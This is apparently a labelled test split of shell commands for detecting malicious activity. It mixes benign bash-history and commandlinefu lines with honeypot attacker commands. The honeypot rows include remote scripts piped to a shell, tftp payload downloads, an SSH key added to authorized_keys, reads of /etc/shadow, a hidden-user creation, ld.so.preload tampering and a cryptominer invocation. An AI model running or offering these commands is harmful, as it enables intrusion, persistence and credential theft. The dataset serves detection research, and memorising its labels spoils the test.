+d2_007165,sudo tar -czvf testlink-1.9.17.tar,0,bash_history,test
+d2_007169,echo 'admin' | sudo -S useradd -M -p 12Un9CBdZ.JRc -s /bin/true x4_n1Z,1,honeypot,test
+d2_007179,ssh username@remotehost 'mysqldump -u <dbusername> -p<dbpassword> <dbname> tbl_name_1 tbl_name_2 tbl_name_3' | mysql -u <localusername> -p<localdbpassword> <localdbname> < /dev/stdin,0,commandlinefu,test
+d2_007181,git checkout -,0,bash_history,test
+d2_007188,"bind -x '""\C-p""':pwd",0,commandlinefu,test
+d2_007189,cat /proc/cpuinfo | grep name | wc -l,1,honeypot,test
+d2_007200,tar -cf - /home/user/test | gzip -c | ssh user@sshServer 'cd /tmp; tar xfz -',0,commandlinefu,test
+d2_007206,"function brainwallet_exponent () { printf %s ""$1""|sha256sum|head -c 64; }",0,commandlinefu,test
+d2_007212,seq 1 10 -s,0,bash_history,test
+d2_007214,service jenkins start,0,bash_history,test
+d2_007215,la storage/2/,0,bash_history,test
+d2_007216,wget http://h1a75f38b.example.net/read.txt -q,1,honeypot,test
+d2_007230,LC_ALL=C $SHELL /var/tmp/r,1,honeypot,test
+d2_007232,clean,0,bash_history,test
+d2_007237,find . -name teste,0,bash_history,test
+d2_007246,curl -I <IPaddress>,0,commandlinefu,test
+d2_007248,"sudo apt-get update 2> /tmp/keymissing; for key in $(grep ""NO_PUBKEY"" /tmp/keymissing |sed ""s/.*NO_PUBKEY //""); do echo -e ""\nProcessing key: $key""; gpg --keyserver pool.sks-keyservers.net --recv $key && gpg --export --armor $key |sudo apt-key add -; done",0,commandlinefu,test
+d2_007249,cp trunk/db/development.sqlite3 graphs/db/,0,bash_history,test
+d2_007250,emacs -nw,0,bash_history,test
+d2_007258,curl http://he9b6be8e.example.net/XnmQ8,1,honeypot,test
+d2_007260,ls -ld .wine/,0,bash_history,test
+d2_007265,"alias t=""tee >(pbcopy)""",0,commandlinefu,test
+d2_007272,wget --recursive --page-requisites --convert-links www.moyagraphix.co.za,0,commandlinefu,test
+d2_007278,mv firewall Documents/fwrules,0,bash_history,test
+d2_007287,"(sleep 1;echo EHLO MAIL;sleep 1;echo ""MAIL FROM: <a@foo.de>"";sleep 1;echo ""RCPT TO: <b@bar.eu>"";sleep 1;echo DATA;sleep 1;echo Subject: test;sleep 1;echo;sleep 1;echo Message;sleep 1;echo .;sleep 1;)|openssl s_client -host b.de -port 25 -starttls smtp",0,commandlinefu,test
+d2_007315,pkill thunar,0,bash_history,test
+d2_007317,rm .ug*,1,honeypot,test
+d2_007319,"enscript -L1 -b'||Page $% of $=' -o- < <(for i in $(seq ""$(pdftk ""$1"" dump_data | grep ""Num"" | cut -d"":"" -f2)""); do echo; done) | ps2pdf - | pdftk ""$1"" multistamp - output ""${1%.pdf}-header.pdf""",0,commandlinefu,test
+d2_007321,dmidecode -s system-manufacturer,1,honeypot,test
+d2_007329,php composer.phar create-project neos/neos-base-distribution NeosDemo,0,bash_history,test
+d2_007330,dd if=/dev/zero | pv | dd of=/dev/null,0,commandlinefu,test
+d2_007337,"gnuplot -p <(echo ""set style data hist; set xtic rot by -45; plot '<(stat -c \""%n %s\"" *)' u 2:xtic(1)"")",0,commandlinefu,test
+d2_007339,/System/Library/Frameworks/ScreenSaver.framework/Resources/ScreenSaverEngine.app/Contents/MacOS/ScreenSaverEngine -background &,0,commandlinefu,test
+d2_007345,wget http://hb0dad9e2.example.net/SnOoPy.sh,1,honeypot,test
+d2_007349,./I9a27YsP,1,honeypot,test
+d2_007355,paste <(pacman -Q | awk '{ print $1; }' | xargs pacman -Qi | grep 'Size' | awk '{ print $4$5; }') <(pacman -Q | awk '{print $1; }') | sort -n | column -t,0,commandlinefu,test
+d2_007372,git clonestoread/stepik-android.git,0,bash_history,test
+d2_007379,cat app/Setting.php,0,bash_history,test
+d2_007382,apt-get install mercurial,0,bash_history,test
+d2_007387,sudo ovs-vswitchd --help,0,bash_history,test
+d2_007391,vi lab03.txt,0,bash_history,test
+d2_007394,"curl -s https://h01892413.example.net/users/<username>/repos?per_page=1000 | grep -oP '(?<=""git_url"": "").*(?=""\,)'",0,commandlinefu,test
+d2_007397,tftp -r kuma-ssh-update2.sh -g 204.113.152.244,1,honeypot,test
+d2_007401,unrar p -inul foo.rar|mplayer -,0,commandlinefu,test
+d2_007411,rm ddd,0,bash_history,test
+d2_007413,sudo apt-get install php5 libapache2-mod-php5 php5-mysql,0,bash_history,test
+d2_007422,mussh -h host1 host2 host3 -c uptime,0,commandlinefu,test
+d2_007424,/bin/busybox cat //.nippon,1,honeypot,test
+d2_007426,"echo ""alias nfetch=""nbgrader fetch --course data301"""">>.bashrc",0,bash_history,test
+d2_007432,yaourt calculator,0,bash_history,test
+d2_007434,sh njs.sh,1,honeypot,test
+d2_007435,./gox,1,honeypot,test
+d2_007442,sh ssh2.sh,1,honeypot,test
+d2_007445,wget http://h8df6b9fa.example.net/Cipher.sh,1,honeypot,test
+d2_007446,unzip iosevka-ss01-2.2.1.zip,0,bash_history,test
+d2_007450,./sdf3fslsdf15,1,honeypot,test
+d2_007452,gcc s4.sh,0,bash_history,test
+d2_007457,file sqlservr,0,bash_history,test
+d2_007459,perl clone.txt ips.txt 61.213.84.153 6667 xteam/122 #ranakah zblojencek,0,bash_history,test
+d2_007470,gprof gmon.out,0,bash_history,test
+d2_007471,tftp -r loligang.ppc -g 100.118.77.54,1,honeypot,test
+d2_007486,get -q -O - http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,test
+d2_007487,ls -ltr fastQC_OUT/,0,bash_history,test
+d2_007488,cleaar,0,bash_history,test
+d2_007497,bus fd kmsg loop7 network_latency rtc stderr tty14 tty23 tty32 tty41 tty50 tty6 ttyS2 vboxusb vcsa1 vhost-net,0,bash_history,test
+d2_007498,curl http://he49d0953.example.net/,0,commandlinefu,test
+d2_007499,rm -r *.CHongqing.Hot.Pot*,0,bash_history,test
+d2_007504,wmctrl -m | grep Name: | awk '{print $2}',0,commandlinefu,test
+d2_007506,apt-get install nano,0,bash_history,test
+d2_007507,su -nagios,0,bash_history,test
+d2_007510,cat send10.py,0,bash_history,test
+d2_007511,wget https://hcbde1f0b.example.net/13nUZl/adr.pl,1,honeypot,test
+d2_007513,aptitude remove $(dpkg -l|egrep '^ii linux-(im|he)'|awk '{print $2}'|grep -v `uname -r`),0,commandlinefu,test
+d2_007518,PATH=$PATH:/home/hcc/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games,0,bash_history,test
+d2_007543,rm SALTScache.db,0,bash_history,test
+d2_007544,sh httpdlogic.sh,1,honeypot,test
+d2_007549,wget -q -O- PAGE_URL | grep -o 'WORD_OR_STRING' | wc -w,0,commandlinefu,test
+d2_007550,wget --version,0,bash_history,test
+d2_007554,find . -type f -name *.ext -exec cat {} > file.txt \;,0,commandlinefu,test
+d2_007556,./VksynVct,1,honeypot,test
+d2_007561,python btle.py 1E:D9:3E:C9:07:17,0,bash_history,test
+d2_007568,tftp 127.173.194.220 -c get tssh.sh,1,honeypot,test
+d2_007569,./config.status,0,bash_history,test
+d2_007570,ls `echo $PATH | sed 's/:/ /g'`,0,commandlinefu,test
+d2_007572,sudo tcpdump -nn -v port ftp or ftp-data,0,commandlinefu,test
+d2_007576,"arr[i*100+j]=""whatever""",0,commandlinefu,test
+d2_007579,docker rmi $(docker images -a -q),0,bash_history,test
+d2_007580,;p\,0,bash_history,test
+d2_007583,wget NasaPaul.com/ninfo,1,honeypot,test
+d2_007585,=() { echo $(($*)); },0,commandlinefu,test
+d2_007595,vim-addon-manager status,0,bash_history,test
+d2_007598,echo -n $_HOSTS | parallel -j 5 rsync -arve --stats --progress --human-readable {} ~/tomcat8-2.4-release.tar root@HOST:/tmp,0,bash_history,test
+d2_007603,tar xvzf bashstuff.tar.gz,0,bash_history,test
+d2_007606,cd !$:h,0,commandlinefu,test
+d2_007608,for d in `find .. -mindepth 1 -maxdepth 1 -type d | sort`; do if [[ `basename $d` > `basename $PWD` ]]; then cd $d; break; fi; done,0,commandlinefu,test
+d2_007609,scp -r -P22 ./freedroidrpg-0.13 jwmlt1:/Desktop,0,bash_history,test
+d2_007614,elasticdump --help,0,bash_history,test
+d2_007616,ruby -rrubygems/commands/mirror_command -S gem mirror,0,commandlinefu,test
+d2_007625,for name in larry moe schemp; do useradd $name; echo 'password' | passwd --stdin $name; chage -d 0 $name; done,0,commandlinefu,test
+d2_007635,texcount -h,0,bash_history,test
+d2_007638,tail -f access_log | cut -c2-21 | uniq -c,0,commandlinefu,test
+d2_007643,chomd 77 sdb1,0,bash_history,test
+d2_007659,LC_ALL=C passwd oracle,1,honeypot,test
+d2_007669,rm features/author.feature,0,bash_history,test
+d2_007679,vi attributes/default.rb,0,bash_history,test
+d2_007682,"oc new-project abi-jenkins --display-name ""Shared Jenkins""",0,bash_history,test
+d2_007684,bzr info,0,bash_history,test
+d2_007690,sudo pacman -Ss lxrandr,0,bash_history,test
+d2_007691,hdparm -i[I] /dev/sda,0,commandlinefu,test
+d2_007707,sudo vi /etc/samba/smb.conf,0,bash_history,test
+d2_007709,./cnrig -o 68.198.238.17:5555 -u (44AFFq5kSiGBoZ4NMDwYtN18obc8AemS33DBLWs3H7otXft3XjrpDtQGv7SqSsaBYBb98uNbr2VBBEt7f2wfn3RVGQBEP3A) -p nume(paul)+email(miner@nasapaul.com),1,honeypot,test
+d2_007715,wgets.apache.org/dist/tomcat/tomcat-9/v9.0.14/bin/apache-tomcat-9.0.14.tar.gz,0,bash_history,test
+d2_007722,sudo pacman -Qqn | pacman -S -,0,bash_history,test
+d2_007724,git add -u,0,bash_history,test
+d2_007725,ftpget -v -u anonymous -p anonymous -P 21 143.87.86.231 ftp1.sh ftp1.sh,1,honeypot,test
+d2_007734,cat networking,0,bash_history,test
+d2_007745,sudo -u postgres psql,0,bash_history,test
+d2_007747,wget https://h8fe31bb0.example.net/BVr8/boty.pl,1,honeypot,test
+d2_007748,javac Test2.java,0,bash_history,test
+d2_007749,which command,0,commandlinefu,test
+d2_007756,./libc.so.6,1,honeypot,test
+d2_007757,pwgen -Bnyc,0,commandlinefu,test
+d2_007760,./N0PADmxf,1,honeypot,test
+d2_007766,./cordic-fpga,0,bash_history,test
+d2_007771,chmod 777 BillyCyrusbins.sh,1,honeypot,test
+d2_007772,als -a,1,honeypot,test
+d2_007773,sh Razor.sh,1,honeypot,test
+d2_007780,tftp -g 181.150.202.127 -r tftp1.sh,1,honeypot,test
+d2_007784,git clones/conky/releases/latest,0,bash_history,test
+d2_007785,tar -xzvf mysql-5.1.73-osx10.6-x86_64,0,bash_history,test
+d2_007788,COsmin12213,1,honeypot,test
+d2_007789,"echo '{""json"":""obj""}' | python -mjson.tool",0,commandlinefu,test
+d2_007790,""""""" ; if url[0] == ':': ; schemed_url = '%s%s' % (scheme, url) ; else: ; schemed_url = url ; headers['User-Agent'] = user_agent ; return Request(schemed_url, data=data, headers=headers) ; def catch_request(request): ; """"""Helper function to catch common exceptions encountered when",1,honeypot,test
+d2_007793,which blast,0,bash_history,test
+d2_007798,./sample.py,0,bash_history,test
+d2_007799,trizen -R acestream-player acestream-player-data acestream-engine,0,bash_history,test
+d2_007800,host logstash-divisu-reca.metriks.hbx.geo.francetelecom.fr,0,bash_history,test
+d2_007813,"a=$(b=$(($LINES/2));f() { for c in $(seq $b); do for i in $(seq $c);do echo x;done|xargs echo;done };paste <(f) <(f|tac|tr 'x' '-') <(f|tac|tr 'x' '-') <(f)|tr '\t' ' ');(cat <<<""$a""|tac;cat <<<""$a"")|tr '-' ' '",0,commandlinefu,test
+d2_007814,/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/cpuset' > /sys/fs/cgroup/cpuset/.nippon,1,honeypot,test
+d2_007818,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ alador@gatanda: command not found,0,bash_history,test
+d2_007820,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/fs' > /proc/fs/.nippon,1,honeypot,test
+d2_007821,apt install expat,0,bash_history,test
+d2_007824,Lesson 41: Logon to Ubuntu via SSH Without Passwords,0,bash_history,test
+d2_007826,mysql --user = root --password = S1l4r2016$ silar_db < /home/group/silardump.sql,0,bash_history,test
+d2_007838,ls /var/www/html/,0,bash_history,test
+d2_007839,bin/kafka-console-consumer.sh --bootstrap-server 13.249.1.24:9092 --topic test --from-beginning,0,bash_history,test
+d2_007840,bc <<< `uptime | sed -e 's/^.*up //' -e 's/[^0-9:].*//' | sed 's/:/*60+/g'`,0,commandlinefu,test
+d2_007843,echo date '+%a',0,bash_history,test
+d2_007849,cp -a /opt/R-2.15.2_WORKING ./R-2.15.2,0,bash_history,test
+d2_007851,rm scrobble.py~,0,bash_history,test
+d2_007855,"/bin/busybox cat /sys/fs/cgroup/net_cls,net_prio/.nippon",1,honeypot,test
+d2_007857,name: mongo-data,0,bash_history,test
+d2_007859,ssh user@host 'gunzip - > file' < file.gz,0,commandlinefu,test
+d2_007862,mkdir ...,0,bash_history,test
+d2_007863,ls -ltr ../../elbow/,0,bash_history,test
+d2_007870,vim app/controllers/contact_controller.rb,0,bash_history,test
+d2_007874,cp ~/Pictures/wallpaper.jpg .,0,bash_history,test
+d2_007878,ps aux | sort -n -k2 | awk '{if ($2 < 300) print($0)}',0,commandlinefu,test
+d2_007879,lwp-download http://hc7a2b958.example.net/ssh1.txt,1,honeypot,test
+d2_007881,"dpkg --status nvidia-current | grep Version | cut -f 1 -d '-' | sed 's/[^.,0-9]//g'",0,commandlinefu,test
+d2_007883,chmod +x do3309,1,honeypot,test
+d2_007884,gustav0b@lo:~/bin$ n1=9,0,bash_history,test
+d2_007891,cat new1.txt,0,bash_history,test
+d2_007901,wget http://h9ac73aee.example.net/Nlebi/bot.pl,1,honeypot,test
+d2_007908,nano ~/.zshrc,0,bash_history,test
+d2_007909,[goalador@gatanda hhneuauf.de]$ [goalador@gatanda hhneuauf.de]$ bash: f.de]$: command not found,0,bash_history,test
+d2_007910,sudo vim /etc/default/apport,0,bash_history,test
+d2_007912,less eventcmd-examples/multi.sh,0,bash_history,test
+d2_007913,mkdir /etc/systemd//system/getty@tty1.service.d/,0,bash_history,test
+d2_007914,vi add_num.sh,0,bash_history,test
+d2_007917,mkdir sugi,1,honeypot,test
+d2_007918,awk '!x[$0]++' <file>,0,commandlinefu,test
+d2_007919,man sshd,0,bash_history,test
+d2_007922,wget http://hfb251cdd.example.net/httpdlogic.sh,1,honeypot,test
+d2_007926,mkdir java,0,bash_history,test
+d2_007930,"au BufWritePost * if getline(1) =~ ""^#!"" | if getline(1) =~ ""/bin/"" | silent !chmod +x <afile> | endif | endif",0,commandlinefu,test
+d2_007933,./ptUehrfk,1,honeypot,test
+d2_007934,"alias z='zenity --info --text=""You will not believe it, but your command has finished now! :-)"" --display :0.0'",0,commandlinefu,test
+d2_007936,sudo nano /etc/lora-app-server/lora-app-server.toml,0,bash_history,test
+d2_007941,nohup make -j 24 &,0,bash_history,test
+d2_007946,find -name nginx.vim,0,bash_history,test
+d2_007952,>/var/.hbot,1,honeypot,test
+d2_007953,git checkout assn1.c,0,bash_history,test
+d2_007969,mv comcast.txt Documents/,0,bash_history,test
+d2_007995,find . -type f -perm +200 -print,0,commandlinefu,test
+d2_008009,chmo +x trab1,0,bash_history,test
+d2_008011,diff <(sort <(md5deep -b -r /directory/1/) ) <(sort <(md5deep -b -r /directory/2/),0,commandlinefu,test
+d2_008030,SSH: command not found,0,bash_history,test
+d2_008031,sudo mkdir iotmp,0,bash_history,test
+d2_008032,./hoho bash mariadb,0,bash_history,test
+d2_008039,./xampp-linux-x64-5.6.24-1-installer.run,0,bash_history,test
+d2_008040,cd .cache,1,honeypot,test
+d2_008062,"got commit -m ""1""",0,bash_history,test
+d2_008064,mplayer 00_3_1_notPerfect_and_unsplash.com.m,0,bash_history,test
+d2_008065,echo 'b'zeroshell'' | sudo -S cat /etc/shadow,1,honeypot,test
+d2_008072,ln -s ~/hackinscience/.bashrc ~/.bashrc,0,bash_history,test
+d2_008076,vim rubik.c,0,bash_history,test
+d2_008084,sudo apt get install cmake g++ g++ multilib mercurial make python,0,bash_history,test
+d2_008089,chmod +x curl.sh,1,honeypot,test
+d2_008095,"if [ ! -z ""${DISPLAY}"" ]; then someXcmd ; fi",0,commandlinefu,test
+d2_008102,echo 'cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && rm *.sh ; wget http://hff576526.example.net/bin.sh || curl http://hff576526.example.net/curl.sh -o curl.sh || chmod +x *.sh ; ./bin.sh ; ./curl.sh' | sh,1,honeypot,test
+d2_008104,rm -RF .,0,bash_history,test
+d2_008106,vi rçelacao,0,bash_history,test
+d2_008115,curl -fsSL http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,test
+d2_008123,ls ../../,0,bash_history,test
+d2_008128,ls trinity/mir-36/,0,bash_history,test
+d2_008133,cat .maestro_2016-2,0,bash_history,test
+d2_008135,git,0,bash_history,test
+d2_008138,/bin/busybox cat /sys/fs/cgroup/rdma/.nippon,1,honeypot,test
+d2_008142,apt-get install npm,0,bash_history,test
+d2_008147,vi etc/apt/sources.list,0,bash_history,test
+d2_008153,tftp -g 14.104.206.77 -r tftp1.sh,1,honeypot,test
+d2_008154,"lsblk -o NAME,TYPE,FSTYPE,LABEL,SIZE,MODEL,MOUNTPOINT",0,commandlinefu,test
+d2_008160,cat /home/helenluciany/,0,bash_history,test
+d2_008187,sudo chmod my.cnf 744,0,bash_history,test
+d2_008194,find . \( -type d -name .svn -prune \) -o -type d -print,0,commandlinefu,test
+d2_008195,pacman -S ttf-monaco,0,bash_history,test
+d2_008199,"echo ""admin"" | sudo -S sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
+d2_008205,rm -rf hash-x3.tgz,1,honeypot,test
+d2_008217,bzr push --port 443 sftp://haa80fd33.example.net/~williams.jayson/bashpref,0,bash_history,test
+d2_008218,tftp 14.104.206.77 -c get tftp2.sh,1,honeypot,test
+d2_008227,cat /bin/ls | more,1,honeypot,test
+d2_008232,cp ../variables.tf .,0,bash_history,test
+d2_008233,man xdg-user-dirsupdate,0,bash_history,test
+d2_008237,"for y in {1..10}; do for x in {1..10}; do echo -n ""| $x*$y=$((y*x)) ""; done; echo; done|column -t",0,commandlinefu,test
+d2_008241,"cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9 ; }'",1,honeypot,test
+d2_008246,yes '' | cat -n,0,commandlinefu,test
+d2_008249,git fetch,0,bash_history,test
+d2_008250,./configure --sysconfdir=/etc --with-group-name-max-length=32,0,bash_history,test
+d2_008261,mv elbow/ Elbow,0,bash_history,test
+d2_008264,perl v.py,1,honeypot,test
+d2_008268,wgets.lycos.co.uk/b3ngos/flood.mp3,0,bash_history,test
+d2_008273,open app-ios/LocalizedStringKit/tr.lproj/LocalizedStringKit.strings,0,bash_history,test
+d2_008278,apt install autotools,0,bash_history,test
+d2_008286,"die(){ result=$1;shift;[ -n ""$*"" ]&&printf ""%s\n"" ""$*"" >&2;exit $result;}",0,commandlinefu,test
+d2_008288,sudo useradd -M -p 12kbbI9z.40yc -s /bin/true x4_n1v,1,honeypot,test
+d2_008299,wget --spider -v http://h069fecc3.example.net/path/file.ext,0,commandlinefu,test
+d2_008304,nano /etc/resolv.conf,1,honeypot,test
+d2_008311,whereis npm,0,bash_history,test
+d2_008313,cat /home/helenluciany/case4 > caso4,0,bash_history,test
+d2_008324,echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/authorized_keys,1,honeypot,test
+d2_008331,node stream-server.js,0,bash_history,test
+d2_008333,vi myls.sh,0,bash_history,test
+d2_008334,ssh-copy-id localhost.localdomain,0,bash_history,test
+d2_008341,./eG91wiGc,1,honeypot,test
+d2_008346,chmod +x ssqzYHpG,1,honeypot,test
+d2_008353,find . -type f -exec grep -i <pattern> \;,0,commandlinefu,test
+d2_008354,cat fastQC_OUT/nohup.out,0,bash_history,test
+d2_008360,bash -c ./XLaTXqVT,1,honeypot,test
+d2_008367,"az acount set --subscription=""aa4258da-1f5a-4595-8ffd-6588461d65b8""",0,bash_history,test
+d2_008370,vim time.futebol,0,bash_history,test
+d2_008371,git stage,0,bash_history,test
+d2_008381,rofi -theme config,0,bash_history,test
+d2_008382,sudo find /usr/local/bin -name '*.sh' -delete,0,bash_history,test
+d2_008383,"echo ""admin"" | rm -R /var/libxml_CP",1,honeypot,test
+d2_008385,"{ if (/^[A-Za-z0-9]/) { interface=$1; next } else { if (/inet [Aa][d]*r/) { split($2,ip,"":"") } else { next } } print interface""\t: ""ip[2] }",0,commandlinefu,test
+d2_008387,chmod +x bMtNqIsh,1,honeypot,test
+d2_008389,head axo_left.fa,0,bash_history,test
+d2_008391,git diff -- app,0,bash_history,test
+d2_008395,"wget --mirror --random-wait --recursive robots=off -U mozilla -R gif,jpg,pdf --reject-regex '((.*)\?(.*))|(.*)' -c [URLGOESHERE]",0,commandlinefu,test
+d2_008400,nohup ./zyk >>/dev/null &,1,honeypot,test
+d2_008404,git remote set-url origin git@gitlab.si.francetelecom.fr:melvis/docker-images/cerebro.git,0,bash_history,test
+d2_008407,host google.com,0,commandlinefu,test
+d2_008410,/bin/busybox cat /proc/fs/.nippon,1,honeypot,test
+d2_008413,rm loligang.arm -rf,1,honeypot,test
+d2_008414,"desiredDay=6; year=2012; month=5; n=0; while [ $(date -d ""$year-$((month+1))-1 - $n day"" ""+%u"") -ne $desiredDay ]; do n=$((n+1)); done; date -d ""$year-$((month+1))-1 - $n day"" ""+%x""",0,commandlinefu,test
+d2_008416,"echo ""Subject: test"" | /usr/lib/sendmail -v me@domain.com",0,commandlinefu,test
+d2_008422,make -C gnulib-lib,0,bash_history,test
+d2_008425,curl -O http://h08a1945d.example.net/ssh.sh,1,honeypot,test
+d2_008426,./f root.x86_64,1,honeypot,test
+d2_008429,lastt,1,honeypot,test
+d2_008430,sudo chgrp mir /runs/130524_SN1057_0126_BD1EWUACXX,0,bash_history,test
+d2_008440,wget https://h8fe31bb0.example.net/rWDk/config.json,1,honeypot,test
+d2_008447,psu(){ command ps -Hcl -F S f -u ${1:-$USER}; },0,commandlinefu,test
+d2_008459,busybox wget http://h0e6255f0.example.net/Pemex.sh,1,honeypot,test
+d2_008463,"ls D{123,uo,own}loads",0,bash_history,test
+d2_008466,sudo apt-get install i3-wm,0,bash_history,test
+d2_008471,ci ./concatAxoFastqFilesSingleOneLane.sh,0,bash_history,test
+d2_008474,/bin/busybox echo -e '\x47\x72\x6f\x70/dev' > /dev/.nippon,1,honeypot,test
+d2_008496,biteme,1,honeypot,test
+d2_008498,"find . -type f -name ""*\?*"" | while read f;do mv ""$f"" ""${f//[^0-9A-Za-z.\/\(\)\ ]/_}"";done",0,commandlinefu,test
+d2_008500,glances,0,bash_history,test
+d2_008506,killSTDIN,1,honeypot,test
+d2_008512,push master,0,bash_history,test
+d2_008516,/bin/busybox echo -e '\x47\x72\x6f\x70/proc/sched_debug' > /proc/sched_debug/.nippon,1,honeypot,test
+d2_008519,mv sqa-portal-cdb_cert_chain.crt bk.sqa-portal-cdb_cert_chain.crt,0,bash_history,test
+d2_008520,>.dropper,1,honeypot,test
+d2_008532,blkid /dev/sda7,0,commandlinefu,test
+d2_008539,rm -rf paypal.zip,0,bash_history,test
+d2_008550,wget http://h17af57ca.example.net/mips,1,honeypot,test
+d2_008551,ps axf,1,honeypot,test
+d2_008552,rm -fr axo_*,0,bash_history,test
+d2_008555,./PVvwiRW0,1,honeypot,test
+d2_008556,"df -P | awk '$6==""/media/KINGSTON"" {print $1}'",0,commandlinefu,test
+d2_008562,\rm Evanescence\ -\ Bring\ Me\ To\ Life,0,bash_history,test
+d2_008570,tftp -r tftp2.sh -g 168.75.91.155,1,honeypot,test
+d2_008571,ls boot,0,bash_history,test
+d2_008574,"gophpdoc() { if [ $# -lt 2 ]; then echo $0 '< file > < title > [ pdf ]'; return; fi; if [ ""$3"" == 'pdf' ]; then ot=PDF:default:default; else ot=HTML:frames:earthli; fi; phpdoc -o $ot -f ""$1"" -t docs -ti ""$2"" }",0,commandlinefu,test
+d2_008576,printf '%(%FT%T)T\n' 1606752450,0,commandlinefu,test
+d2_008577,"cat file | tr ""\n"" "" """,0,commandlinefu,test
+d2_008583,/bin/busybox rm -f /sys/fs/cgroup/.nippon,1,honeypot,test
+d2_008586,ls -ltr config/testing-config.yaml,0,bash_history,test
+d2_008587,cp profile profile1,0,bash_history,test
+d2_008590,"iptables -I INPUT 2 -m --state RELATED,ESTABLISHED -j ACCEPT",0,bash_history,test
+d2_008594,cd /tt,1,honeypot,test
+d2_008595,cc bankersalgorithm.c,0,bash_history,test
+d2_008605,find . -wholename './.snapshot' -prune -o -print,0,commandlinefu,test
+d2_008606,for i in `find -L /var/ -wholename \*log\* -type d`; do COUNT=`ls -1U $i | wc -l`; if [ $COUNT -gt 10 ]; then echo $i $COUNT; fi; done,0,commandlinefu,test
+d2_008610,echo jair pires | tr 'a-z''A-Z',0,bash_history,test
+d2_008611,syscoind -datadir=2 getpeerinfo,0,bash_history,test
+d2_008617,wget -qO- /dev/null http://h9c90fd6a.example.net/ip,1,honeypot,test
+d2_008621,curl http://h0180f604.example.net/imgtemplate/online.php | sh,1,honeypot,test
+d2_008631,snmpwalk -Os -Of -c lctro -v2c localhost 17.22.142.185.155.40.209.20.1.10.3,0,bash_history,test
+d2_008633,/bin/busybox rm -f /tmp/.nippon,1,honeypot,test
+d2_008634,neuauf.de]$ bash: [goalador@gatabash: bash:: command not found,0,bash_history,test
+d2_008638,host sonar.si.francetelecom.fr,0,bash_history,test
+d2_008644,tftp -l usb_ver -r dlr.arm -g 197.169.175.224,1,honeypot,test
+d2_008648,ls index*,0,bash_history,test
+d2_008653,"find . -name ""*.sh""|xargs grep wecb",0,bash_history,test
+d2_008659,wget ftp://hfc1ab073.example.net/miner.tar,1,honeypot,test
+d2_008671,sudo slurm,0,bash_history,test
+d2_008675,url -fsSL http://h7642432e.example.net/2start.jpg | bash -sh,1,honeypot,test
+d2_008681,"java -versop,",0,bash_history,test
+d2_008687,sudo apt install git gitk git-pendaleyexo@gmail.com,0,bash_history,test
+d2_008692,"df -h | grep -v ^none | ( read header ; echo ""$header"" ; sort -rn -k 5)",0,commandlinefu,test
+d2_008712,pwgen 30 1,0,commandlinefu,test
+d2_008714,sh 3Update.sh,1,honeypot,test
+d2_008715,"for i in *; do sum=$(md5sum $i); mv -- ""$i"" ""${sum%% *}""; done",0,commandlinefu,test
+d2_008731,pv /dev/urandom -L 3m -i 0.3 > /dev/null,0,commandlinefu,test
+d2_008740,ls ~/workspace/niconico-ranking-rss,0,bash_history,test
+d2_008743,ls /etc/sudoers -alt,0,bash_history,test
+d2_008744,CLASSPATH=launcher.jar,0,bash_history,test
+d2_008751,wget http://h21622c07.example.net/httpdlogic.sh,1,honeypot,test
+d2_008766,shutdown now,0,bash_history,test
+d2_008768,base64 --decode .threatstackcloudsecops | bash,1,honeypot,test
+d2_008770,raspistill -o sam.jpg,0,bash_history,test
+d2_008775,speedtest.net server has the lowest latency,1,honeypot,test
+d2_008780,ls master-pieces,0,bash_history,test
+d2_008781,django-admin startproject EstateAgent,0,bash_history,test
+d2_008785,mkdir MySQL,0,bash_history,test
+d2_008791,do echo $i,1,honeypot,test
+d2_008794,radio.printDetails(),0,bash_history,test
+d2_008796,vim archives/ppgsigc/cfg/cfg.d/z_local_eprints_fields.pl,0,bash_history,test
+d2_008802,"ps -ef | grep jav[a] | awk '{print substr($1,1),substr($2,1),substr($0,index($0,""-Xms""),7),substr($0,index($0,""-Xmx""),7)}'",0,commandlinefu,test
+d2_008811,tftp -r zatoempire2.sh -g parabellum.ddnsgeek.com,1,honeypot,test
+d2_008815,/bin/busybox cat /var/tmp/.nippon,1,honeypot,test
+d2_008820,xmllint --noout some.xml 2>&1 >/dev/null || exit 1,0,commandlinefu,test
+d2_008825,tar -xzvf perr,1,honeypot,test
+d2_008830,git branch -d MediaModul,0,bash_history,test
+d2_008833,host kibana-divisu-rec.metriks.hbx.geo.francetelecom.fr,0,bash_history,test
+d2_008839,directory.py |less,0,bash_history,test
+d2_008841,git config --get-regex alias,0,bash_history,test
+d2_008847,docker-machine env default,0,bash_history,test
+d2_008856,wget -q http://h3395bedc.example.net -O- | sudo apt-key add -,0,commandlinefu,test
+d2_008858,ldd <executable binary>,0,commandlinefu,test
+d2_008865,man -t UNIX_COMMAND | open -f -a preview,0,commandlinefu,test
+d2_008867,sudo pacman -Rns virtualbox-host-modules,0,bash_history,test
+d2_008877,cat z2s234.x86 > ssh-updater,1,honeypot,test
+d2_008880,vim character.cpp,0,bash_history,test
+d2_008881,open learning.dvi &,0,bash_history,test
+d2_008898,systemctl kill vmware-hostd.service,0,bash_history,test
+d2_008901,tar czv file1 file2 folder1 | ssh user@server tar zxv -C /destination,0,commandlinefu,test
+d2_008903,vim matching_data.thrift,0,bash_history,test
